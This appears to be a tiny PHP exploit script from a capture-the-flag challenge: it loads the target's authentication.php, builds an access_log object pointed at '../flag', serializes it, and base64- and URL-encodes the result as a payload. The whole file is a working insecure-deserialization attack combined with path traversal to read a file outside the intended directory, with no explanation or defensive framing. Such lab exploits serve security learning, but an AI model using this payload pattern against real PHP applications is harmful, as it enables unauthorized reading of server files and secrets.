<?php 

require_once("authentication.php");

$val = urlencode(base64_encode(serialize(new access_log("../flag"))));

echo($val);
?>